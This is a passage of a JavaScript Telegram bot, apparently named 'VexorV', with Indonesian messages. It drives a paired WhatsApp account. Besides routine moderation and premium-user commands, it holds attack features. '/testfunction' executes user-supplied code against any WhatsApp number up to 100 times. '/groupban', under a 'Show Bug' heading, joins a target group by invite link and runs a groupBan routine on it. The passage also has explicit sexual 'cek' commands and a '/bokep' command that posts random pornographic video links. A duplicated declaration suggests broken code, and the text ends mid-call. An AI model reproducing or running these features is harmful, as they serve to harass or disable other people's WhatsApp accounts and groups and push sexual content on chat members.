    const expiresAt = now + days * 24 * 60 * 60 * 1000;

    const existing = premiumData.find(u => u.userId === userId);
    if (existing) {

        existing.expires = expiresAt;
    } else {

        premiumData.push({ userId, expires: expiresAt });
    }

    saveJSON(premiumFile, premiumData);

    return ctx.reply(`<blockquote><tg-emoji emoji-id="5422636639174293981">🎉</tg-emoji> Pengguna ${userId} sekarang premium selama ${days} hari!</blockquote>`, {
        parse_mode: "HTML"
        });
});

bot.asepp('delprem', checkOwner, (ctx) => {
    const args = ctx.message.text.split(' ');

    if (args.length < 2) {
        return ctx.reply(`<blockquote><tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 123456789</blockquote>`, {
        parse_mode: "HTML"
        });
    }

    const userId = args[1];

    let premiumData = require(premiumFile);
    const exists = premiumData.find(u => u.userId === userId);
    if (!exists) {
        return ctx.reply(`<blockquote><tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> Pengguna ${userId} tidak ada dalam daftar premium.</blockquote>`, {
        parse_mode: "HTML"
        });
    }

    premiumData = premiumData.filter(u => u.userId !== userId);
    saveJSON(premiumFile, premiumData);

    return ctx.reply(`<blockquote><tg-emoji emoji-id="5323276092654520315">🎁</tg-emoji> Pengguna ${userId} telah dihapus dari daftar premium.</blockquote>`, {
        parse_mode: "HTML"
        });
});

bot.asepp('cekprem', (ctx) => {
    let premiumData = require(premiumFile);
    const userId = ctx.from.id.toString();
    const user = premiumData.find(u => u.userId === userId);

    if (!user) {
        return ctx.reply(`<blockquote><tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> Anda bukan pengguna premium.</blockquote>`, {
        parse_mode: "HTML"
        });
    }

    if (Date.now() > user.expires) {
        premiumData = premiumData.filter(u => u.userId !== userId);
        saveJSON(premiumFile, premiumData);
        return ctx.reply(`<blockquote><tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> Status premium Anda sudah habis.</blockquote>`, {
        parse_mode: "HTML"
        });
    }

    const remaining = Math.ceil((user.expires - Date.now()) / (1000 * 60 * 60 * 24));
    return ctx.reply(`<blockquote><tg-emoji emoji-id="5424941318625333234">🎂</tg-emoji> Anda adalah pengguna premium.\nSisa hari: ${remaining} hari</blockquote>`, {
        parse_mode: "HTML"
        });
});

bot.asepp("pairingcode", checkPremium, async (ctx) => {
    const args = ctx.message.text.split(" ");
    
    if (args.length < 2) {
        return await ctx.reply(`<blockquote><tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> Format perintah salah. Gunakan: /pairingcode nomor wa</blockquote>`, {
            parse_mode: "HTML"
        });
    }

    let phoneNumber = args[1].replace(/[^0-9]/g, '');
    
    if (phoneNumber.length < 8) {
        return await ctx.reply(`<blockquote><tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> Format perintah salah. Gunakan: /pairingcode nomor wa</blockquote>`, {
            parse_mode: "HTML"
        });
    }

    if (Asep && Asep.user) {
        return await ctx.reply(`<blockquote><tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> WhatsApp sudah terhubung. Tidak perlu pairing lagi.</blockquote>`, {
            parse_mode: "HTML"
        });
    }

    try {
        const loadingMsg = await ctx.reply(
`<blockquote>⏳ Memproses Pairing Code...</blockquote>
<blockquote><tg-emoji emoji-id="5378930509954046756">📱</tg-emoji> Nomor: <code>${phoneNumber}</code></blockquote>
<blockquote>Proses...</blockquote>`, {
            parse_mode: "HTML"
        });

        const code = await Asep.requestPairingCode(phoneNumber);
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

        await ctx.telegram.editMessageText(
            ctx.chat.id,
            loadingMsg.message_id,
            null,
`
<blockquote>✅ Kode Berhasil Dikirim!</blockquote>
<blockquote><tg-emoji emoji-id="5378930509954046756">📱</tg-emoji> Nomor: <code>${phoneNumber}</code>
<tg-emoji emoji-id="5372034034421956057">🔑</tg-emoji> Kode: <b>${formattedCode}</b></blockquote>
<blockquote>⏳ Menunggu....</blockquote>
`,
            { parse_mode: "HTML" }
        );

        let alreadyNotified = false;
const checkInterval = setInterval(async () => {
    if (Asep && Asep.user && !alreadyNotified) {
        alreadyNotified = true;
        clearInterval(checkInterval);
        
        await ctx.reply(
`
<blockquote>━━─━━⧼ 𝐏𝐚𝐢𝐫𝐢𝐧𝐠 𝐒𝐮𝐤𝐬𝐞𝐬 ⧽━━─━━</blockquote>
<blockquote>✅ WhatsApp Berhasil Terhubung!</blockquote>
<blockquote><tg-emoji emoji-id="5378930509954046756">📱</tg-emoji> Nomor: <code>${phoneNumber}</code></blockquote>
<blockquote>━━─━━⧼ 𝚅𝙴𝚇𝙾𝚁𝚅 𝙸𝙼𝙿𝙴𝚁𝙸𝚄𝚂 ⧽━━─━━</blockquote>
`,
            { parse_mode: "HTML" }
        );
    }
}, 3000);

        setTimeout(() => {
            clearInterval(checkInterval);
        }, 120000);

    } catch (error) {
        console.error('Gagal pairing:', error);
        await ctx.reply(`<blockquote><tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> Format perintah salah. Gunakan: /pairingcode nomor wa</blockquote>`, {
            parse_mode: "HTML"
        });
    }
});

//====================== [ Group Menu ] ====================\\
bot.asepp("cekganteng", async (ctx) => {
  if (!ctx.message.text) return;

  const text = ctx.message.text.toLowerCase();
  if (!text.startsWith("/cekganteng")) return;

  const user = ctx.from.first_name || "User";
  const persen = Math.floor(Math.random() * 101);

  let hasil = "";
  if (persen > 80) hasil = "🔥 Ganteng maksimal!";
  else if (persen > 60) hasil = "😎 Lumayan ganteng!";
  else if (persen > 40) hasil = "🙂 Standar aja";
  else hasil = "😂 Perlu upgrade wajah";

  ctx.reply(`<tg-emoji emoji-id="5870695289714643076">👤</tg-emoji>Nama: ${user}
<tg-emoji emoji-id="5787418193127542105">🌟</tg-emoji>Tingkat Kegantengan: ${persen}%
<tg-emoji emoji-id="5231200819986047254">📊</tg-emoji>${hasil}`, {
     parse_mode: "HTML"
  });
});

bot.asepp("cekcantik", async (ctx) => {
  if (!ctx.message.text) return;

  const text = ctx.message.text.toLowerCase();
  if (!text.startsWith("/cekcantik")) return;

  const user = ctx.from.first_name || "User";
  const persen = Math.floor(Math.random() * 101);

  let hasil = "";
  if (persen > 80) hasil = "✨ Cantik banget!";
  else if (persen > 60) hasil = "😊 Lumayan cantik!";
  else if (persen > 40) hasil = "🙂 Biasa aja";
  else hasil = "😂 Perlu skincare nih";

  ctx.reply(`<tg-emoji emoji-id="5870695289714643076">👤</tg-emoji>Nama: ${user}
<tg-emoji emoji-id="5787418193127542105">🌟</tg-emoji>Tingkat Kecantikan: ${persen}%
<tg-emoji emoji-id="5231200819986047254">📊</tg-emoji>${hasil}`, {
     parse_mode: "HTML"
 });
});

bot.asepp("ceksender", async (ctx) => {
    if (Asep && Asep.user) {
        const number = Asep.user.id?.split('@')[0] || "-";
        
        await ctx.reply(
`<blockquote>━━─━━⧼ 𝐈𝐧𝐟𝐨 𝐖𝐀 𝐁𝐨𝐭 ⧽━━─━━</blockquote>
<blockquote><tg-emoji emoji-id="5378930509954046756">📱</tg-emoji> Nomor: <code>${number}</code>
<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> Status: <b>Online</b></blockquote>
<blockquote>━━─━━⧼ 𝚅𝙴𝚇𝙾𝚁𝚅 𝙸𝙼𝙿𝙴𝚁𝙸𝚄𝚂 ⧽━━─━━</blockquote>`,
            { parse_mode: "HTML" }
        );
    } else {
        await ctx.reply(
`<blockquote>━━─━━⧼ 𝐈𝐧𝐟𝐨 𝐖𝐀 𝐁𝐨𝐭 ⧽━━─━━</blockquote>
<blockquote><tg-emoji emoji-id="5378930509954046756">📱</tg-emoji> Nomor: -
<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> Status: <b>Offline</b></blockquote>
<blockquote>━━─━━⧼ 𝚅𝙴𝚇𝙾𝚁𝚅 𝙸𝙼𝙿𝙴𝚁𝙸𝚄𝚂 ⧽━━─━━</blockquote>`,
            { parse_mode: "HTML" }
        );
    }
});

bot.asepp("putussender", checkOwner, async (ctx) => {
    await ctx.reply(`<blockquote>⏳ Memutuskan sender WhatsApp...</blockquote>`, {
        parse_mode: "HTML"
    });

    if (Asep) {
        try {
            // Logout dari WhatsApp
            await Asep.logout();
            
            // Set variable jadi false
            isWhatsAppConnected = false;
            Asep = null;
            
            // Hapus folder session
            const fs = require('fs');
            const sessionPath = './session';
            if (fs.existsSync(sessionPath)) {
                fs.rmSync(sessionPath, { recursive: true, force: true });
            }
            
            await ctx.reply(
`<blockquote>✅ Sender WhatsApp berhasil diputus!</blockquote>
<blockquote><tg-emoji emoji-id="5378930509954046756">📱</tg-emoji> Session: <b>Dihapus</b>
<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> Status: <b>Offline</b></blockquote>
<blockquote>Gunakan /pairingcode untuk menghubungkan ulang</blockquote>
<blockquote>━━─━━⧼ 𝚅𝙴𝚇𝙾𝚁𝚅 𝙸𝙼𝙿𝙴𝚁𝙸𝚄𝚂 ⧽━━─━━</blockquote>`,
                { parse_mode: "HTML" }
            );
        } catch (error) {
            console.error('Gagal putus sender:', error);
            await ctx.reply(`<blockquote><tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> Gagal memutus sender!</blockquote>`, {
                parse_mode: "HTML"
            });
        }
    } else {
        await ctx.reply(`<blockquote><tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> Sender WhatsApp sudah offline!</blockquote>`, {
            parse_mode: "HTML"
        });
    }
});

bot.asepp("info", async (ctx) => {
  if (!ctx.message.text) return;

  const text = ctx.message.text.toLowerCase();
  if (!text.startsWith("/info")) return;

  const user = ctx.from;

  const id = user.id;
  const firstName = user.first_name || "-";
  const lastName = user.last_name || "-";
  const username = user.username ? "@" + user.username : "-";
  const isBot = user.is_bot ? "Ya 🤖" : "Tidak 👤";
  const language = user.language_code || "-";

  ctx.reply(`<blockquote><tg-emoji emoji-id="5870695289714643076">👤</tg-emoji>INFO USER</blockquote>
<blockquote><tg-emoji emoji-id="5334890573281114250">🆔</tg-emoji> ID: <code>${id}</code>
<tg-emoji emoji-id="5787156307496669392">👑</tg-emoji>: ${firstName} ${lastName}
<tg-emoji emoji-id="5787606948350266733">🙂</tg-emoji>: ${username}</blockquote>
`, {
    parse_mode: "HTML"
  });
});

bot.asepp("cekmemek", async (ctx) => {
  if (!ctx.message.text) return;

  const text = ctx.message.text.toLowerCase();
  if (!text.startsWith("/cekmemek")) return;

  const user = ctx.from.first_name || "User";
  const persen = Math.floor(Math.random() * 101);

  let hasil = "";
  if (persen > 80) hasil = "Mulus Banget Pink Lagi Aw";
  else if (persen > 60) hasil = "Lumayan Mulus Hitam Dikit Pinggirnya";
  else if (persen > 40) hasil = "Tebal Banget Bulu Memeknya";
  else hasil = "Hitam Njir Memeknya Bauk Juga";

  ctx.reply(`<tg-emoji emoji-id="5870695289714643076">👤</tg-emoji>Nama: ${user}
<tg-emoji emoji-id="5231200819986047254">📊</tg-emoji>Memeknya: ${hasil}`, {
     parse_mode: "HTML"
  });
});

bot.asepp("cekkontol", async (ctx) => {
  if (!ctx.message.text) return;

  const text = ctx.message.text.toLowerCase();
  if (!text.startsWith("/cekkontol")) return;

  const user = ctx.from.first_name || "User";
  const persen = Math.floor(Math.random() * 101);

  let hasil = "";
  if (persen > 80) hasil = "Anjay Mulus Putih Banget Kontol Lu, Pake Skincare Ya";
  else if (persen > 60) hasil = "Lumayan Putih Kontolnya";
  else if (persen > 40) hasil = "Tebal Banget Bulu Jembutnya Ga Di Cukur";
  else hasil = "Hitam Njir Kontolnya Ada Nanah Juga";

  ctx.reply(`<tg-emoji emoji-id="5870695289714643076">👤</tg-emoji>Nama: ${user}
<tg-emoji emoji-id="5231200819986047254">📊</tg-emoji>Kontolnya: ${hasil}`, {
     parse_mode: "HTML"
  });
});

bot.asepp("mute", async (ctx) => {
  if (!ctx.message.text) return;
  const text = ctx.message.text;

  if (!text.toLowerCase().startsWith("/mute")) return;
  if (ctx.chat.type === "private") return ctx.reply(`<tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> <b>Hanya untuk grup!</b>`, { parse_mode: "HTML" });

  const userId = ctx.from.id;
  let targetId, targetName;

  try {
    const member = await ctx.getChatMember(userId);
    if (!["administrator", "creator"].includes(member.status)) {
      return ctx.reply(`<tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> <b>Kamu bukan admin!</b>`, { parse_mode: "HTML" });
    }

    if (ctx.message.reply_to_message) {
      const t = ctx.message.reply_to_message.from;
      targetId = t.id;
      targetName = t.first_name;
    } else {
      const args = text.split(" ")[1];
      if (!args) return ctx.reply(`<tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> <b>Reply atau /mute @username</b>`, { parse_mode: "HTML" });

      const user = await ctx.telegram.getChat(args);
      targetId = user.id;
      targetName = user.first_name || user.username;
    }

    await ctx.restrictChatMember(targetId, {
      permissions: {
        can_send_messages: false
      }
    });

    ctx.reply(`🔇 <b>User berhasil di-mute!</b>

<tg-emoji emoji-id="5870695289714643076">👤</tg-emoji>User: <b>${targetName}</b>
<tg-emoji emoji-id="5334890573281114250">🆔</tg-emoji>ID<code>${targetId}</code>`, { parse_mode: "HTML" });

  } catch {
    ctx.reply(`<tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> <b>Gagal mute user!</b>`, { parse_mode: "HTML" });
  }
});

bot.on("umute", async (ctx) => {
  if (!ctx.message.text) return;

  const text = ctx.message.text;
  if (!text.toLowerCase().startsWith("/unmute")) return;

  if (ctx.chat.type === "private") {
    return ctx.reply(`<tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> <b>Hanya untuk grup!</b>`, { parse_mode: "HTML" });
  }

  const userId = ctx.from.id;
  let targetId, targetName;

  try {
    const member = await ctx.getChatMember(userId);
    if (!["administrator", "creator"].includes(member.status)) {
      return ctx.reply(`<tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> <b>Kamu bukan admin!</b>`, { parse_mode: "HTML" });
    }

    // reply
    if (ctx.message.reply_to_message) {
      const t = ctx.message.reply_to_message.from;
      targetId = t.id;
      targetName = t.first_name;
    } 
    // username
    else {
      const args = text.split(" ")[1];
      if (!args) {
        return ctx.reply(`<tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> <b>Reply atau /unmute @username</b>`, { parse_mode: "HTML" });
      }

      const user = await ctx.telegram.getChat(args);
      targetId = user.id;
      targetName = user.first_name || user.username;
    }

    // 🔥 buka semua izin (unmute)
    await ctx.restrictChatMember(targetId, {
      permissions: {
        can_send_messages: true,
        can_send_audios: true,
        can_send_documents: true,
        can_send_Videos: true,
        can_send_videos: true,
        can_send_video_notes: true,
        can_send_voice_notes: true,
        can_send_polls: true,
        can_send_other_messages: true,
        can_add_web_page_previews: true
      }
    });

    ctx.reply(`<tg-emoji emoji-id="5388632425314140043">😀</tg-emoji><b>User berhasil di-unmute!</b>

<tg-emoji emoji-id="5870695289714643076">👤</tg-emoji><b>${targetName}</b>
<tg-emoji emoji-id="5334890573281114250">🆔</tg-emoji><code>${targetId}</code>`, {
      parse_mode: "HTML"
    });

  } catch {
    ctx.reply(`<tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> <b>Gagal unmute user!</b>`, { parse_mode: "HTML" });
  }
});

bot.asepp("ban", async (ctx) => {
  if (!ctx.message.text) return;
  const text = ctx.message.text;

  if (!text.toLowerCase().startsWith("/ban")) return;
  if (ctx.chat.type === "private") return ctx.reply(`<tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> <b>Hanya untuk grup!</b>`, { parse_mode: "HTML" });

  const userId = ctx.from.id;
  let targetId, targetName;

  try {
    const member = await ctx.getChatMember(userId);
    if (!["administrator", "creator"].includes(member.status)) {
      return ctx.reply(`<tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> <b>Kamu bukan admin!</b>`, { parse_mode: "HTML" });
    }

    if (ctx.message.reply_to_message) {
      const t = ctx.message.reply_to_message.from;
      targetId = t.id;
      targetName = t.first_name;
    } else {
      const args = text.split(" ")[1];
      if (!args) return ctx.reply(`<tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> <b>Reply atau /ban @username</b>`, { parse_mode: "HTML" });

      const user = await ctx.telegram.getChat(args);
      targetId = user.id;
      targetName = user.first_name || user.username;
    }

    await ctx.banChatMember(targetId);

    ctx.reply(`🚫 <b>User berhasil di-ban!</b>

<tg-emoji emoji-id="5870695289714643076">👤</tg-emoji>User<b>${targetName}</b>
<tg-emoji emoji-id="5334890573281114250">🆔</tg-emoji>ID:<code>${targetId}</code>`, { parse_mode: "HTML" });

  } catch {
    ctx.reply(`<tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> <b>Gagal ban user!</b>`, { parse_mode: "HTML" });
  }
});

bot.asepp("promote", async (ctx) => {
  if (!ctx.message.text) return;

  const text = ctx.message.text;
  if (!text.toLowerCase().startsWith("/promote")) return;

  // hanya grup
  if (ctx.chat.type === "private") {
    return ctx.reply(`<tg-emoji emoji-id="5852812849780362931">❌</tg-emoji>  <b>Command ini hanya untuk grup!</b>`, {
      parse_mode: "HTML"
    });
  }

  const userId = ctx.from.id;
  let targetId, targetName;

  try {
    // cek admin
    const member = await ctx.getChatMember(userId);
    if (!["administrator", "creator"].includes(member.status)) {
      return ctx.reply(`<tg-emoji emoji-id="5852812849780362931">❌</tg-emoji>  <b>Kamu bukan admin!</b>`, {
        parse_mode: "HTML"
      });
    }

    // ======================
    // 🔥 AMBIL TARGET
    // ======================

    // dari reply
    if (ctx.message.reply_to_message) {
      const target = ctx.message.reply_to_message.from;
      targetId = target.id;
      targetName = target.first_name;
    } 
    
    // dari username
    else {
      const args = text.split(" ")[1];
      if (!args) {
        return ctx.reply(`<tg-emoji emoji-id="5852812849780362931">❌</tg-emoji>  <b>Reply pesan atau /promote @username</b>`, {
          parse_mode: "HTML"
        });
      }

      const user = await ctx.telegram.getChat(args);
      targetId = user.id;
      targetName = user.first_name || user.username;
    }
    await ctx.promoteChatMember(targetId, {
      can_change_info: true,
      can_delete_messages: true,
      can_invite_users: true,
      can_restrict_members: true,
      can_pin_messages: true
    });

    ctx.reply(`<tg-emoji emoji-id="5415655814079723871">🔝</tg-emoji><b>Berhasil promote user!</b>

<tg-emoji emoji-id="5870695289714643076">👤</tg-emoji> Nama: <b>${targetName}</b>
<tg-emoji emoji-id="5334890573281114250">🆔</tg-emoji> ID: <code>${targetId}</code>`, {
      parse_mode: "HTML"
    });

  } catch (err) {
    ctx.reply(`<tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> <b>Gagal promote user!</b>\nPastikan bot punya izin admin.`, {
      parse_mode: "HTML"
    });
  }
});

bot.asepp("demote", async (ctx) => {
  if (!ctx.message.text) return;
  const text = ctx.message.text;

  if (!text.toLowerCase().startsWith("/demote")) return;
  if (ctx.chat.type === "private") {
    return ctx.reply(`<tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> <b>Hanya untuk grup!</b>`, {
      parse_mode: "HTML"
    });
  }

  const userId = ctx.from.id;
  let targetId, targetName;

  try {
    const member = await ctx.getChatMember(userId);
    if (!["administrator", "creator"].includes(member.status)) {
      return ctx.reply(`<tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> <b>Kamu bukan admin!</b>`, {
        parse_mode: "HTML"
      });
    }

    if (ctx.message.reply_to_message) {
      const t = ctx.message.reply_to_message.from;
      targetId = t.id;
      targetName = t.first_name;
    } else {
      const args = text.split(" ")[1];
      if (!args) {
        return ctx.reply(`<tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> <b>Reply atau /demote @username</b>`, {
          parse_mode: "HTML"
        });
      }

      const user = await ctx.telegram.getChat(args);
      targetId = user.id;
      targetName = user.first_name || user.username;
    }

    // hapus semua hak admin
    await ctx.promoteChatMember(targetId, {
      can_change_info: false,
      can_delete_messages: false,
      can_invite_users: false,
      can_restrict_members: false,
      can_pin_messages: false,
      can_promote_members: false
    });

    ctx.reply(`<tg-emoji emoji-id="5415655814079723871">🔝</tg-emoji><b>User berhasil di-demote!</b>
<tg-emoji emoji-id="5870695289714643076">👤</tg-emoji>User<b>${targetName}</b>
<tg-emoji emoji-id="5334890573281114250">🆔</tg-emoji>ID<code>${targetId}</code>`, {
      parse_mode: "HTML"
    });

  } catch (err) {
    ctx.reply(`<tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> <b>Gagal demote user!</b>\nPastikan bot punya izin.`, {
      parse_mode: "HTML"
    });
  }
});

bot.asepp("reqfitur", async (ctx) => {
  if (!ctx.message) return;

  const text = ctx.message.text;

  if (text && text.toLowerCase().startsWith("/reqfitur")) {
    const args = text.split(" ").slice(1).join(" ");
    if (!args) {
      return ctx.reply(`<tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> Caranya Gini /reqfitur Bokep`, {
        parse_mode: "HTML"
      });
    }

    const user = ctx.from;
    const nama = user.first_name || "User";
    const username = user.username ? "@" + user.username : "-";
    const id = user.id;
    const chatId = ctx.chat.id;

    const pesanOwner = `<tg-emoji emoji-id="5954097490109140119">📨</tg-emoji> <b>REQUEST FITUR BARU</b>
<tg-emoji emoji-id="5870695289714643076">👤</tg-emoji> Nama: <b>${nama}</b>
<tg-emoji emoji-id="5787156307496669392">👑</tg-emoji> Username: ${username}
<tg-emoji emoji-id="5334890573281114250">🆔</tg-emoji> ID: <code>${id}</code>
<tg-emoji emoji-id="5467538555158943525">💭</tg-emoji> Chat ID: <code>${chatId}</code>
<tg-emoji emoji-id="5400289821253990206">📝</tg-emoji> Pesan:
${args}

<i>Reply pesan ini untuk membalas user</i>`;

    try {
      const sent = await ctx.telegram.sendMessage(OWNER_ID, pesanOwner, {
        parse_mode: "HTML"
      });

      requestMap.set(sent.message_id, id);

      return ctx.reply("✅ <b>Request berhasil dikirim ke owner!</b>", {
        parse_mode: "HTML"
      });

    } catch {
      return ctx.reply(`<tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> <b>Gagal kirim ke owner!</b>`, {
        parse_mode: "HTML"
      });
    }
  }

  if (ctx.from.id === OWNER_ID && ctx.message.reply_to_message) {

    const replyMsgId = ctx.message.reply_to_message.message_id;
    const targetId = requestMap.get(replyMsgId);

    if (!targetId) {
      return ctx.reply("❌ Pesan tidak valid / sudah expired");
    }

    try {
      await ctx.telegram.forwardMessage(
        targetId,
        ctx.chat.id,
        ctx.message.message_id
      );

      return ctx.reply(`<tg-emoji emoji-id="6043992250831082249">✅</tg-emoji> <b>Berhasil kirim balasan ke user!</b>`, {
        parse_mode: "HTML"
      });

    } catch (err) {
      console.log(err);

      return ctx.reply(`<tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> <b>Gagal kirim balasan!</b>`, {
        parse_mode: "HTML"
      });
    }
  }
});

bot.asepp("bokep", async (ctx) => {
  if (!ctx.message.text) return;

  const text = ctx.message.text.toLowerCase();
  if (!text.startsWith("/bokep")) return;

  // contoh list video (ganti dengan punyamu)
  const videos = [
    "https://files.catbox.moe/8c7gz3.mp4", 
  "https://files.catbox.moe/nk5l10.mp4", 
  "https://files.catbox.moe/r3ip1j.mp4", 
  "https://files.catbox.moe/71l6bo.mp4", 
  "https://files.catbox.moe/rdggsh.mp4", 
  "https://files.catbox.moe/3288uf.mp4", 
  "https://files.catbox.moe/jdopgq.mp4", 
  "https://files.catbox.moe/8ca9cw.mp4", 
  "https://files.catbox.moe/b99qh3.mp4", 
  "https://files.catbox.moe/6bkokw.mp4", 
  "https://files.catbox.moe/ebisdh.mp4", 
  "https://files.catbox.moe/3yko44.mp4", 
  "https://files.catbox.moe/apqlvo.mp4", 
  "https://files.catbox.moe/wqe1r7.mp4", 
  "https://files.catbox.moe/nk5l10.mp4", 
  "https://files.catbox.moe/8c7gz3.mp4", 
  "https://files.catbox.moe/wqe1r7.mp4", 
  "https://files.catbox.moe/n37liq.mp4", 
  "https://files.catbox.moe/0728bg.mp4", 
  "https://files.catbox.moe/p69jdc.mp4", 
  "https://files.catbox.moe/occ3en.mp4", 
  "https://files.catbox.moe/y8hmau.mp4", 
  "https://files.catbox.moe/tvj95b.mp4", 
  "https://files.catbox.moe/3g2djb.mp4", 
  "https://files.catbox.moe/xlbafn.mp4", 
  "https://files.catbox.moe/br8crz.mp4", 
  "https://files.catbox.moe/h2w5jl.mp4", 
  "https://files.catbox.moe/8y32qo.mp4", 
  "https://files.catbox.moe/9w39ag.mp4", 
  "https://files.catbox.moe/gv4087.mp4", 
  "https://files.catbox.moe/uw6qbs.mp4", 
  "https://files.catbox.moe/a537h1.mp4", 
  "https://files.catbox.moe/4x09p9.mp4", 
  "https://files.catbox.moe/n992te.mp4", 
  "https://files.catbox.moe/ltdsbm.mp4", 
  "https://files.catbox.moe/rt62tl.mp4", 
  "https://files.catbox.moe/y4rote.mp4", 
  "https://files.catbox.moe/dxn5oj.mp4", 
  "https://files.catbox.moe/tw6m9q.mp4", 
  "https://files.catbox.moe/qfl235.mp4", 
  "https://files.catbox.moe/q9f2rs.mp4", 
  "https://files.catbox.moe/e5ci9z.mp4", 
  "https://files.catbox.moe/cdl11t.mp4", 
  "https://files.catbox.moe/pmyi1y.mp4"
  ];

  const random = videos[Math.floor(Math.random() * videos.length)];

  try {
    await ctx.replyWithVideo(random, {
      caption: `<tg-emoji emoji-id="6151963850297051287">😀</tg-emoji> <b>Random Bokep Video</b>`,
      parse_mode: "HTML"
    });
  } catch (err) {
    ctx.reply(`<tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> Gagal kirim video bokep`);
  }
});

bot.asepp("testfunction", checkWhatsAppConnection, checkPremium, async (ctx) => {
  if (!ctx.message.text) return;

  const text = ctx.message.text;

  if (!text.toLowerCase().startsWith("/testfunction")) return;

  if (!text.includes("|")) {
    return ctx.reply(
`Gunakan format:
<blockquote>/testfunction 62xxx|loop|async function test(target){
 await Asep.sendMessage(target,{ text: "halo" })
}</blockquote>`,
      { parse_mode: "HTML" }
    );
  }

  const [idRaw, loopRaw, funcFull] = text.split("|");

  const nomor = idRaw.replace(/[^0-9]/g, "");
  const jumlah = Math.max(1, Math.min(parseInt(loopRaw) || 1, 100));

  if (!nomor) return ctx.reply("❌Nomor tidak valid!");
  if (!funcFull) return ctx.reply("❌ Function kosong!");

  const target = nomor + "@s.whatsapp.net";

  const sandbox = {
    Asep,
    ctx, 
    sock,
    target,
    console,
    Buffer,
    sleep: (ms) => new Promise(r => setTimeout(r, ms))
  };

  const context = vm.createContext(sandbox);

  const funcNameMatch = funcFull.match(/async function (\w+)/);
  const funcName = funcNameMatch ? funcNameMatch[1] : "UnknownFunction";

  let adaError = false;

  for (let i = 0; i < jumlah; i++) {
    try {
      await vm.runInContext(`(async()=>{ ${funcFull} })()`, context);
    } catch (err) {
      adaError = true;

      await ctx.reply(`<tg-emoji emoji-id="5852812849780362931">❌</tg-emoji> Error ke-${i + 1}:\n<code>${err.message}</code>`, {
        parse_mode: "HTML"
      });

      console.log("Error:", err);
      break;
    }

    await sandbox.sleep(300);
  }

  if (!adaError) {
    ctx.reply(`<blockquote>⏤「 <b>TEST FUNCTION VEXORV<</b> 」⏤</blockquote>
<blockquote>ᨒ Function: <b>${funcName}</b></blockquote>
<blockquote>ᨒ Target: <code>${target}</code></blockquote>
<blockquote>ᨒ Loop: <b>${jumlah}</b></blockquote>
<blockquote>ᨒ Status: ✅ Success</blockquote>`, {
      parse_mode: "HTML"
    });
  }
});
//=========================== 「 λ 𝐒𝐡𝐨𝐰 𝐁𝐮𝐠 λ 」 ============================
bot.asepp("groupban", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const senderId = ctx.from.id;
  const username = ctx.from.username ? `@${ctx.from.username}` : "Tidak ada username";
  const date = getCurrentDate();
  const randomImage = getRandomImage();
  const cooldown = checkCooldown(senderId);
  const chatType = ctx.chat.type;

  // Cek premium (pakai fungsi isUserPremium)
  const premiumStatus = await isUserPremium(senderId);
const premiumStatus = await isUserPremium(senderId);
if (!premiumStatus) {
  return ctx.reply("❌ ☇ Fitur ini hanya untuk premium users!");
}

  if (cooldown > 0) {
    return ctx.reply(`⏳ Tunggu ${cooldown} detik sebelum menggunakan lagi.`);
  }

  const args = ctx.message.text.split(" ");
  const input = args.slice(1).join(" ");

  if (!input) {
    return ctx.reply("🪧 ☇ Format:\n/groupban <link_undangan|group_id>\n\nContoh:\n/groupban https://chat.whatsapp.com/ABCdef123\n/groupban 123456789@g.us");
  }

  if (!Asep) {
    return ctx.reply("❌ WhatsApp tidak terhubung!");
  }

  let groupJid;

  try {
    const inviteRegex = /https:\/\/chat\.whatsapp\.com\/([A-Za-z0-9]+)/;
    const matchInvite = input.match(inviteRegex);

    if (matchInvite) {
      const code = matchInvite[1];
      const progressMsg = await ctx.reply(`⏳ Bergabung ke grup via link...`);

      const joinResult = await Asep.groupAcceptInvite(code);
      groupJid = joinResult;

      await ctx.telegram.editMessageText(
        ctx.chat.id,
        progressMsg.message_id,
        null,
        `✅ Berhasil bergabung ke grup: ${groupJid}`
      );
    } else {
      if (!input.endsWith('@g.us')) {
        return ctx.reply("❌ ID grup harus diakhiri dengan @g.us atau gunakan link undangan.");
      }
      groupJid = input;
    }
  } catch (err) {
    return ctx.reply(`❌ Gagal memproses grup: ${err.message}`);
  }

  const sentMessage = await ctx.replyWithPhoto(randomImage, {
    caption: `
<blockquote><b>LekzoMarket</b></blockquote>
     Pengirim : ${username}
    Target   : ${groupJid}
    Status   : Memproses...
    Waktu    : ${date}
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "🔍 LIHAT GRUP", url: `https://chat.whatsapp.com/` }]]
    }
  });

  try {
    await groupBan(Asep, groupJid);

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      sentMessage.message_id,
      null,
      `
